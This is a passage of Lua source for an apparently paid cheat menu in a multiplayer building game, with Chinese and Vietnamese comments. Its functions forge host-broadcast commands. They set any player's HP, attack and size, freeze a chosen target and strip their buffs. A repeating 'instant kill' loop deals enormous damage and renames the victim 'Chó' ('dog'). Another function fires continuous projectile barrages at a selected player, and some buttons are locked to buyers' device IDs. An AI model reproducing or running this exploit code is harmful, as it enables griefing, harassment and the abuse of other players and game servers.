                        tdata2[1] = "player"
                        tdata2[2] = "setActionAttrState"
                        tdata2[3] = {targetUin, 1, false}  -- false = 禁止移动
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2) 
                        end)
                        -- =======================
                        
                        -- 每10次显示一次提示
                       
                        
                        threadpool:wait(0.01)  -- 0.01秒执行一次（非常快）
                    end
                    
                    ShowGameTipsWithoutFilter("#cFF0000举人循环结束")
                end)
            end
            -- ====================
        end
    end
)
end

-- 人物改血
function rwgx()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("请输入有效数字")
            return
        end
        local tdata1 = {
            [1] = "player",
            [2] = "setAtt",
            [3] = { AccountManager:getUin(), value, 1 }
        }
        local tdata2 = {
            [1] = "player",
            [2] = "setAtt",
            [3] = { AccountManager:getUin(), value, 2 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
    end)
end

-- 召唤坐骑
function zhzq()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("请输入有效坐骑ID")
            return
        end
        CurMainPlayer:summonAccountHorse(value)
    end)
end

-- Sức tấn công bản thân (phiên bản tối ưu)
function pctv8()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("请输入有效攻击力数值")
            return
        end
        
        -- Lấy UID trực tiếp từ nhân vật chính hiện tại
        local myUin = nil
        if CurMainPlayer and CurMainPlayer.getUin then
            pcall(function()
                myUin = CurMainPlayer:getUin()
            end)
        end
        
        if not myUin then
            ShowGameTipsWithoutFilter("获取自身UID失败")
            return
        end

        -- Gửi gói tin chỉnh tấn công (ID 17) cho bản thân
        local tdata = {
            [1] = "player",
            [2] = "setAtt",
            [3] = { myUin, value, 17 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        
        ShowGameTipsWithoutFilter("#c00ffffĐã chỉnh sức tấn công thành: " .. value)
    end)
end

-- 玩家大小
function wjdx()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("请输入有效数字（大小）")
            return
        end
        ShowPlayerList(function(uin)
            if whitelist[uin] then
                ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
                return
            end
            local tdata = {
                [1] = "player",
                [2] = "setAtt",
                [3] = { uin, value, 21 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end, "玩家大小")
    end)
end

function buytr()
	
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not DEVICE_AUTH_DISABLED and not author4[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua sử dụng", 3)
        return
    end
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 单体秒杀功能（左边停止，右边开启）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Trái: Tắt tính năng giết ngay lập tức\nPhải: Bật tính năng giết ngay lập tức và chọn mục tiêu",  -- 消息内容
    "Dừng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止秒杀 =====
            _G.dtms_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Tiêu diệt mục tiêu đã kết thúc")
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启秒杀 =====
            _G.dtms_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Vui lòng vào phòng chơi trước")
                _G.dtms_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Không có người chơi nào khác trong phòng hiện tại")
                _G.dtms_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu cho tiêu diệt",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Vui lòng chọn người chơi để loại ngay lập tức")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để bắt đầu đợt tiêu diệt")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                -- ===== Sử dụng danh sách trắng toàn cục theo ý bạn =====
                if whitelist == nil then
                    whitelist = {}
                end
                
                -- Kiểm tra nếu mục tiêu nằm trong whitelist hoặc là chính mình thì từ chối
                local myUin = AccountManager:getUin()
                if whitelist[targetUin] or targetUin == myUin then
                    ShowGameTipsWithoutFilter("#cFF0000Không thể tấn công bản thân hoặc người trong danh sách trắng!")
                    return
                end
                -- ================================================

                -- ===== Thêm lệnh 64 ngay khi chọn mục tiêu =====
                local initTarget64 = {
                    [1] = "player",
                    [2] = "setActionAttrState",
                    [3] = {targetUin, 64, true}
                }
                pcall(function()
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, initTarget64)
                end)
                -- =============================================

                ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi：" .. targetUin .. "，Bắt đầu chu kỳ kết liễu tức thì (mục tiêu miễn nhiễm với các đòn tấn công)")
                
                -- 启动秒杀循环
                threadpool:work(function()
                    local loopCount = 0
                    
                    while _G.dtms_enabled do
                        loopCount = loopCount + 1
                        
                        -- 每10次重新施加禁止攻击（防止被清除）
                        if loopCount % 10 == 1 then
                            local keepDisable = {
                                [1] = "player",
                                [2] = "setActionAttrState",
                                [3] = {targetUin, 32, false}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, keepDisable)
                            end)
                        end
                        
                        local disableAttack = {
                            [1] = "player",
                            [2] = "forceOpenBoxUI",
                            [3] = {targetUin, 797}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                        end)

                        local disableAttack = {
                            [1] = "player",
                            [2] = "forceOpenBoxUI",
                            [3] = {targetUin, 798}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                        end)
                        
                        local disableAttack = {
                            [1] = "actor",
                            [2] = "setnickname",
                            [3] = {targetUin, '#RChó'}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                        end)
                        
                        local disableAttack = {
                            [1] = "actor",
                            [2] = "changeCustomModel",
                            [3] = {targetUin, [=[mob_3407]=]}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                        end)

                        local diAttack = {
                            [1] = "gamerule",
                            [2] = "setScoreKillPlayer",
                            [3] = {1}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, diAttack)
                        end)
                        
                        local disableAttack1 = {
                            [1] = "player",
                            [2] = "setActionAttrState",
                            [3] = {targetUin, 32, false}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack1)
                        end)
                        
                        -- ===== 设置目标为可攻击状态 (Lệnh 64 chạy liên tục trong vòng lặp) =====
                        local setAttackable = {
                            [1] = "player",
                            [2] = "setActionAttrState",
                            [3] = {targetUin, 64, true}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setAttackable)
                        end)
                        -- ================================
                        
                        -- ===== 清除目标无敌buff =====
                        local clearBuff = {
                            [1] = "buff",
                            [2] = "clearAllBuff",
                            [3] = {targetUin}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, clearBuff)
                        end)
                        -- ===========================
                        
                        -- 播放特效
                        local t1 = {
                            [1] = "actor",
                            [2] = "playBodyEffectByFile",
                            [3] = {targetUin, "jiguang01", true}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t1) 
                        end)
                        
                        local t10 = {
                            [1] = "actor",
                            [2] = "playBodyEffectByFile",
                            [3] = {targetUin, "aotu_06_leishenzhichui", true}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t10) 
                        end)
                        
                        -- 设置属性（可选）
                        local t2 = {
                            [1] = "player",
                            [2] = "setAtt",
                            [3] = {targetUin, 1, 1}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t2) 
                        end)
                        local t3 = {
                            [1] = "player",
                            [2] = "setAtt",
                            [3] = {targetUin, 1, 2}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t3) 
                        end)
                        
                        -- 造成伤害
                        local t4 = {
                            [1] = "actor",
                            [2] = "playerHurt",
                            [3] = {myUin, targetUin, 1.8e+308, 0}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t4) 
                        end)
                        
                        -- 每10次显示一次提示
                        if loopCount % 10 == 0 then
                            ShowGameTipsWithoutFilter("#c00ffffBị tấn công " .. loopCount .. " Mạng")
                        end
                        
                        threadpool:wait(0.000000000000000000000000000000000000000000000000000001)
                    end
                    
                    -- ===== 秒杀结束后恢复目标的攻击能力 =====
                    local enableAttack = {
                        [1] = "player",
                        [2] = "setActionAttrState",
                        [3] = {targetUin, 32, true}
                    }
                    pcall(function()
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, enableAttack)
                        ShowGameTipsWithoutFilter("#c00ff00Khả năng tấn công của mục tiêu đã được khôi phục")
                    end)
                    -- ====================================
                    
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp hạ gục tức thì kết thúc, tổng số lần tấn công " .. loopCount .. " lần")
                end)
            end
            -- ====================
        end
    end
)
end

-- 玩家生命
function wjsm()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Vui lòng nhập giá trị HP hợp lệ")
            return
        end
        ShowPlayerList(function(uin)
            local tdata1 = {
                [1] = "player",
                [2] = "setAtt",
                [3] = { uin, value, 1 }
            }
            local tdata2 = {
                [1] = "player",
                [2] = "setAtt",
                [3] = { uin, value, 2 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
        end, "玩家生命")
    end)
end

-- 玩家攻击力
function wjgjl()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Vui lòng nhập giá trị sức tấn công hợp lệ")
            return
        end
        ShowPlayerList(function(uin)
            -- 已移除 whitelist 白名单检查
            local tdata = {
                [1] = "player",
                [2] = "setAtt",
                [3] = { uin, value, 17 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end, "玩家攻击力")
    end)
end

function pctg1()
    -- Đóng giao diện menu nếu đang mở
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- Kiểm tra xem đang ở trong game không
    if not ClientCurGame or not ClientCurGame:isInGame() then
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R请先进入游戏房间", 3)
        end
        return
    end

    -- BẢNG YES/NO ĐẦU TIÊN: Quản lý trạng thái Dừng / Tiếp tục
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Trái: Dừng bắn vật ném ngay lập tức\nPhải: Tiếp tục thiết lập và bắn vật ném",
        "Dừng lại",  -- Nút trái (btnType == 0) -> Dừng bắn
        "Đồng ý",   -- Nút phải (btnType == 1) -> Hiện bảng nhập liệu tiếp theo
        function(userData, btnType)
            if btnType == 0 then
                -- Dừng bắn vật ném
                _G.stormRainActive = false
                ShowGameTipsWithoutFilter("#cFF0000Đã gửi lệnh dừng bắn vật ném!")
                
            elseif btnType == 1 then
                -- Tiếp tục: Bỏ qua bước nhập ID, dùng mặc định 12837, tiến thẳng tới nhập Tốc độ bay

                -- Bước 1: Thông báo và mở bảng nhập Tốc độ bay
                if ShowGameTipsWithoutFilter then
                    ShowGameTipsWithoutFilter("#c00ffffVui lòng nhập TỐC ĐỘ bay (VD: 400 - 600 để bay cao uốn lượn)")
                end

                ShowTextInputSafe(function(speedText)
                    local customSpeed = tonumber(speedText)
                    if not customSpeed or customSpeed <= 0 then
                        ShowGameTipsWithoutFilter("#cFF0000Tốc độ không hợp lệ! Mặc định dùng 500.")
                        customSpeed = 500
                    end

                    -- Bước 2: Thông báo và mở bảng nhập Số lượng vật ném mỗi đợt
                    if ShowGameTipsWithoutFilter then
                        ShowGameTipsWithoutFilter("#c00ffffVui lòng nhập SỐ LƯỢNG vật ném mỗi đợt (VD: 5)")
                    end

                    ShowTextInputSafe(function(countText)
                        local projectileCount = tonumber(countText)
                        if not projectileCount or projectileCount <= 0 then
                            ShowGameTipsWithoutFilter("#cFF0000Số lượng không hợp lệ! Mặc định dùng 5.")
                            projectileCount = 5
                        end

                        -- Mở bảng chọn người chơi mục tiêu
                        LoadHomelandLuas()
                        local uin_list = GetPlayerUinList()

                        if not uin_list or #uin_list == 0 then
                            ShowGameTipsWithoutFilter("#R当前房间没有其他玩家", 3)
                            return
                        end

                        local data = {
                            visit = {
                                history_num = "Chọn mục tiêu bắn vật ném",
                                today_num = "#cFF7aad Tổng số: " .. #uin_list
                            },
                            event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                            event_visit = {}
                        }

                        for i = 1, #uin_list do
                            data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
                        end

                        GetInst("UIManager"):Open("HomeEventRecord")
                        local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
                        ctrl:UpdateUI(data)
                        
                        getglobal("HomeEventRecordTitleFrameName"):SetText("Chọn mục tiêu để bắn vật ném")
                        getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aad Danh sách phòng")
                        getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aad Nhấn vào người chơi để bắt đầu")

                        local oldClickFunc = ctrl.EnterFriendHomeBtn_OnClick
                        
                        function ctrl:EnterFriendHomeBtn_OnClick()
                            GetInst("UIManager"):Close("HomeEventRecord")
                            ctrl.EnterFriendHomeBtn_OnClick = oldClickFunc

                            local targetUin = this:GetClientID()
                            local selfUin = AccountManager:getUin()
                            local projectileId = 12837 -- ID mặc định theo yêu cầu

                            if targetUin == selfUin then
                                ShowGameTipsWithoutFilter("#RKhông thể chọn chính mình làm mục tiêu!")
                                return
                            end

                            -- Bước 3: Hiện bảng xác nhận Yes/No trước khi bắt đầu bắn liên tục
                            GetInst("MessageBoxInterface"):dualBtnBox(
                                "⚠️ Xác nhận bắn vật ném ⚠️\n- Mục tiêu UIN: " .. tostring(targetUin) .. "\n- ID mặc định: " .. projectileId .. "\n- Tốc độ đạn: " .. customSpeed .. "\n- Số lượng/đợt: " .. projectileCount,
                                "Hủy",     -- Nút trái (btnType == 0) -> Dừng / Hủy
                                "Đồng ý",  -- Nút phải (btnType == 1) -> Bắt đầu bắn
                                function(userData, btnType)
                                    if btnType == 1 then
                                        ShowGameTipsWithoutFilter("#c00ffffĐã BẬT bắn vật ném (ID: 12837) hướng về mục tiêu: " .. targetUin)

                                        -- Bật cờ cho phép chạy vòng lặp liên tục
                                        _G.stormRainActive = true

                                        -- Chạy luồng ngầm tạo vật ném liên tục
                                        threadpool:work(function()
                                            while _G.stormRainActive do
                                                pcall(function()
                                                    -- Lấy tọa độ hiện tại của BẠN (điểm xuất phát)
                                                    local myPlayer = CurMainPlayer
                                                    if not myPlayer then return end
                                                    local myX, myY, myZ = myPlayer:getPosition(0, 0, 0)
                                                    local srcX = myX / 100
                                                    local srcY = myY / 100
                                                    local srcZ = myZ / 100

                                                    -- Lấy tọa độ của NẠN NHÂN (điểm đến)
                                                    local targetPlayer = ClientCurGame:getPlayerByUin(targetUin)
                                                    if targetPlayer then
                                                        local tx, ty, tz = targetPlayer:getPosition(0, 0, 0)
                                                        local targetX = tx / 100
                                                        local targetY = ty / 100
                                                        local targetZ = tz / 100

                                                        -- Bắn một loạt số lượng vật ném từ bạn hướng thẳng tới nạn nhân theo quỹ đạo parabol
                                                        for p = 1, projectileCount do
                                                            local tdata = {
                                                                [1] = "world",
                                                                [2] = "spawnProjectile",
                                                                [3] = { selfUin, projectileId, srcX, srcY, srcZ, targetX, targetY, targetZ, customSpeed }
                                                            }
                                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                                        end
                                                    end
                                                end)

                                                -- Tốc độ xả đạn liên tục (0.3 giây / đợt)
                                                threadpool:wait(0.3)
                                            end
                                            
                                            ShowGameTipsWithoutFilter("#cFF0000Đã dừng bắn vật ném!")
                                        end)
                                    else
                                        ShowGameTipsWithoutFilter("#cFF0000Đã hủy thao tác!")
                                    end
                                end
                            )
                        end
                    end, "Nhập số lượng vật ném")
                end, "Nhập tốc độ bay (VD: 500)")
            end
        end
    )
end

function pctg3()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra quyền hạn thiết bị
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua sử dụng", 3)
        return
    end

    -- Đóng ngay bảng menu giao diện khi ấn vào nút chức năng
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen") -- Đổi tên UI nếu cần khớp với mã game của bạn
    end)

    -- BẢNG 1: Nhập kích thước vùng
    ShowTextInputSafe(function(sizeText)
        if not sizeText or sizeText == "" then
            ShowGameTipsWithoutFilter("Vui lòng nhập kích thước hợp lệ")
            return
        end

        local platform_size = tonumber(sizeText)
        if not platform_size or platform_size <= 0 then
            ShowGameTipsWithoutFilter("Kích thước phải là một con số lớn hơn 0")
            return
        end

        -- BẢNG 2: Nhập ID khối
        ShowTextInputSafe(function(idText)
            if not idText or idText == "" then
                ShowGameTipsWithoutFilter("Vui lòng nhập ID khối hợp lệ")
                return
            end

            local blockId = tonumber(idText)
            if not blockId then
                ShowGameTipsWithoutFilter("ID khối phải là một con số")
                return
            end

            -- BẢNG 3: Hộp thoại Yes/No xác nhận đồng ý hoặc hủy
            GetInst("MessageBoxInterface"):dualBtnBox(
                "Xác nhận tạo sàn với kích thước " .. platform_size .. "x" .. platform_size .. " (ID: " .. blockId .. ")?",
                "Hủy",
                "Đồng ý",
                function(userData, btnType)
                    -- btnType == 0 là nút trái (Hủy), btnType == 1 là nút phải (Đồng ý)
                    if btnType == 1 then
                        local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                        local base_x, base_y, base_z = math.floor(x / 100), math.floor(y / 100), math.floor(z / 100)

                        local half_size = math.floor(platform_size / 2)
                        local floor_y = base_y - 1 

                        -- Tạo vùng nền theo kích thước người dùng nhập
                        for dx = -half_size, half_size - 1 do
                            for dz = -half_size, half_size - 1 do
                                local current_x = base_x + dx
                                local current_z = base_z + dz
                                local tdata = {
                                    [1] = "block",
                                    [2] = "placeBlock",
                                    [3] = { blockId, current_x, floor_y, current_z, 0, -1 }
                                }
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                            end
                        end

                        ShowGameTipsWithoutFilter("#c00ff00Đã tạo sàn " .. platform_size .. "x" .. platform_size .. " tức thì!")
                    else
                        ShowGameTipsWithoutFilter("#cFF0000Đã hủy thao tác!")
                    end
                end
            )
        end)
    end)
end

function pctg4()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra quyền hạn thiết bị
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua sử dụng", 3)
        return
    end

    -- Đóng ngay bảng menu giao diện khi ấn vào nút chức năng
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- Hiển thị bảng nhập size
    ShowTextInputSafe(function(sizeText)
        if not sizeText or sizeText == "" then
            ShowGameTipsWithoutFilter("Vui lòng nhập giá trị size hợp lệ")
            return
        end

        local size = tonumber(sizeText)
        if not size or size <= 0 then
            ShowGameTipsWithoutFilter("Size phải là một con số lớn hơn 0")
            return
        end

        -- Hiển thị bảng Yes/No xác nhận
        GetInst("MessageBoxInterface"):dualBtnBox(
            "Xác nhận tạo vùng boom với size " .. size .. " x " .. size .. "?",
            "Hủy",
            "Đồng ý",
            function(userData, btnType)
                if btnType == 1 then
                    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                    local base_x, base_y, base_z = x / 100, y / 100, z / 100

                    local start_x = base_x + 5
                    local top_y = base_y + size

                    local num_decor = 8
                    local gap = 0
                    if num_decor > 1 then
                        gap = (size - 1) / (num_decor - 1)
                    end

                    -- 1. Tạo khối lập phương bự (ID cố định: 835)
                    for dx = 0, size - 1 do
                        local current_x = start_x + dx
                        for dy = 0, size - 1 do
                            local current_y = base_y + dy
                            for dz = 0, size - 1 do
                                local current_z = base_z - dz
                                local tdata = {
                                    [1] = "block",
                                    [2] = "placeBlock",
                                    [3] = { 835, current_x, current_y, current_z, 0, -1 }
                                }
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                            end
                        end
                    end

                    -- 2. Đặt trang trí ĐÚNG ĐỘ CAO VÀ NẰM TRÊN BỀ MẶT NÓC (ID cố định: 6)
                    for i = 0, num_decor - 1 do
                        local pos_x = start_x + i * gap
                        local pos_z = base_z -- Đặt ngay mép ngoài cùng phía trước
                        local pos_y = top_y  -- Đặt cao hơn so với đỉnh (nằm ngay trên bề mặt)
                        local tdata = {
                            [1] = "block",
                            [2] = "placeBlock",
                            [3] = { 6, pos_x, pos_y, pos_z, 0, -1 }
                        }
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                    end

                    ShowGameTipsWithoutFilter("#c00ff00Đã tạo vùng bom size " .. size .. " thành công!")
                else
                    ShowGameTipsWithoutFilter("#cFF0000Đã hủy thao tác!")
                end
            end
        )
    end)
end

function pctg5()
    -- Đóng giao diện songbook tự động trước khi bắt đầu
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- Bước 1: Nhập kích thước vùng (ví dụ: 30)
    ShowTextInputSafe(function(sizeText)
        if not sizeText or sizeText == "" then
            ShowGameTipsWithoutFilter("Vui lòng nhập kích thước hợp lệ")
            return
        end

        local areaSize = tonumber(sizeText)
        if not areaSize or areaSize <= 0 then
            ShowGameTipsWithoutFilter("Kích thước phải là một số lớn hơn 0")
            return
        end

        -- Bước 2: Nhập số lượng hiệu ứng (ví dụ: 40)
        ShowTextInputSafe(function(countText)
            if not countText or countText == "" then
                ShowGameTipsWithoutFilter("Vui lòng nhập số lượng hợp lệ")
                return
            end

            local totalEffects = tonumber(countText)
            if not totalEffects or totalEffects <= 0 then
                ShowGameTipsWithoutFilter("Số lượng phải là một số lớn hơn 0")
                return
            end

            -- Lấy vị trí hiện tại của người chơi làm tâm
            local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
            local center_x, center_y, center_z = x / 100, y / 100, z / 100

            -- Bước 3: Hộp thoại xác nhận trước khi chạy
            GetInst("MessageBoxInterface"):dualBtnBox(
                "Xác nhận tạo hiệu ứng với vùng " .. areaSize .. "x" .. areaSize .. " (Số lượng: " .. totalEffects .. ")?",
                "Hủy",
                "Đồng ý",
                function(userData, btnType)
                    -- btnType == 0 là nút trái (Hủy), btnType == 1 là nút phải (Đồng ý)
                    if btnType == 1 then
                        ShowGameTipsWithoutFilter("#c00ff00Bắt đầu tạo hiệu ứng sấm sét và laser xanh ngẫu nhiên...")

                        -- Chạy luồng phát hiệu ứng ngẫu nhiên
                        threadpool:work(function()
                            local halfSize = math.floor(areaSize / 2)

                            for i = 1, totalEffects do
                                -- Tạo tọa độ ngẫu nhiên dựa theo kích thước người dùng nhập
                                local offset_x = math.random(-halfSize, halfSize)
                                local offset_y = math.random(-5, 15)  -- Độ cao ngẫu nhiên
                                local offset_z = math.random(-halfSize, halfSize)

                                local px = center_x + offset_x
                                local py = center_y + offset_y
                                local pz = center_z + offset_z

                                -- Ngẫu nhiên kích thước và thời gian tồn tại của hiệu ứng
                                local scale = math.random(2, 5)
                                local duration = math.random(15, 25)

                                -- 1. Gọi hiệu ứng sấm sét
                                CurWorld:playSoundAndParticleEffect(
                                    px, py, pz, 0, 0, 0, 0,
                                    px, py, pz,
                                    'particles/aotu_06_leishenzhichui.ent', scale, duration
                                )

                                -- 2. Gọi hiệu ứng laser xanh
                                CurWorld:playSoundAndParticleEffect(
                                    px, py, pz, 0, 0, 0, 0,
                                    px, py, pz,
                                    'particles/bossskill_lasertailblue.ent', scale, duration
                                )

                                -- Chờ một khoảng thời gian ngắn giữa các lần xuất hiện
                                threadpool:wait(0.08)
                            end

                            ShowGameTipsWithoutFilter("#c00ff00Đã hoàn thành chuỗi hiệu ứng!")
                        end)
                    end
                end
            )
        end)
    end)
end

function pctg6()
    -- Đóng giao diện songbook tự động trước khi bắt đầu
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- Bước 1: Nhập độ cao (height)
    ShowGameTipsWithoutFilter("Vui lòng nhập: Độ cao của hiệu ứng mưa (Height)")
    ShowTextInputSafe(function(heightText)
        if not heightText or heightText == "" then
            ShowGameTipsWithoutFilter("Vui lòng nhập độ cao hợp lệ")
            return
        end
        local inputHeight = tonumber(heightText)
        if not inputHeight or inputHeight <= 0 then
            ShowGameTipsWithoutFilter("Độ cao phải là số lớn hơn 0")
            return
        end

        -- Bước 2: Nhập kích thước size vùng (length/width)
        ShowGameTipsWithoutFilter("Vui lòng nhập: Kích thước vùng mưa (Size)")
        ShowTextInputSafe(function(sizeText)
            if not sizeText or sizeText == "" then
                ShowGameTipsWithoutFilter("Vui lòng nhập size hợp lệ")
                return
            end
            local inputSize = tonumber(sizeText)
            if not inputSize or inputSize <= 0 then
                ShowGameTipsWithoutFilter("Size phải là số lớn hơn 0")
                return
            end

            -- Bước 3: Nhập ID vật phẩm (projectileId)
            ShowGameTipsWithoutFilter("Vui lòng nhập: ID vật phẩm / đạn rơi")
            ShowTextInputSafe(function(idText)
                if not idText or idText == "" then
                    ShowGameTipsWithoutFilter("Vui lòng nhập ID vật phẩm hợp lệ")
                    return
                end
                local inputId = tonumber(idText)
                if not inputId then
                    ShowGameTipsWithoutFilter("ID vật phẩm phải là một con số")
                    return
                end

                -- Bước 4: Nhập số lượng rơi (amount)
                ShowGameTipsWithoutFilter("Vui lòng nhập: Số lượng vật phẩm rơi (Amount)")
                ShowTextInputSafe(function(amountText)
                    if not amountText or amountText == "" then
                        ShowGameTipsWithoutFilter("Vui lòng nhập số lượng hợp lệ")
                        return
                    end
                    local inputAmount = tonumber(amountText)
                    if not inputAmount or inputAmount <= 0 then
                        ShowGameTipsWithoutFilter("Số lượng phải là số lớn hơn 0")
                        return
                    end

                    -- Bước 5: Nhập tốc độ rơi (speed)
                    ShowGameTipsWithoutFilter("Vui lòng nhập: Tốc độ rơi (Speed)")
                    ShowTextInputSafe(function(speedText)
                        if not speedText or speedText == "" then
                            ShowGameTipsWithoutFilter("Vui lòng nhập tốc độ hợp lệ")
                            return
                        end
                        local inputSpeed = tonumber(speedText)
                        if not inputSpeed or inputSpeed <= 0 then
                            ShowGameTipsWithoutFilter("Tốc độ phải là số lớn hơn 0")
                            return
                        end

                        -- Bước 6: Hộp thoại xác nhận Đồng ý / Hủy
                        GetInst("MessageBoxInterface"):dualBtnBox(
                            "Xác nhận tạo mưa?\n(Độ cao: " .. inputHeight .. " | Size: " .. inputSize .. " | ID: " .. inputId .. "\nSố lượng: " .. inputAmount .. " | Tốc độ: " .. inputSpeed .. ")",
                            "Hủy",
                            "Đồng ý",
                            function(userData, btnType)
                                -- btnType == 1 là nút Đồng ý
                                if btnType == 1 then
                                    _G.wefrgetry = (_G.wefrgetry or 0) + 1
                                    local generation = _G.wefrgetry
                                    _G.openstore_enabled = true
                                    InitGameAPI()
                                    GameVmTriggerInit()

                                    -- Bảng cấu hình lấy trực tiếp từ các giá trị vừa nhập
                                    local CONFIG = {
                                        length = inputSize,    
                                        width = inputSize,    
                                        height = inputHeight, 
                                        amount = inputAmount,         
                                        speed = inputSpeed,           
                                        interval = 0.1,       
                                        projectileId = inputId 
                                    }

                                    ShowGameTipsWithoutFilter("Đã bắt đầu hiệu ứng Mưa (chạy 1 lần)!")

                                    threadpool:work(function()
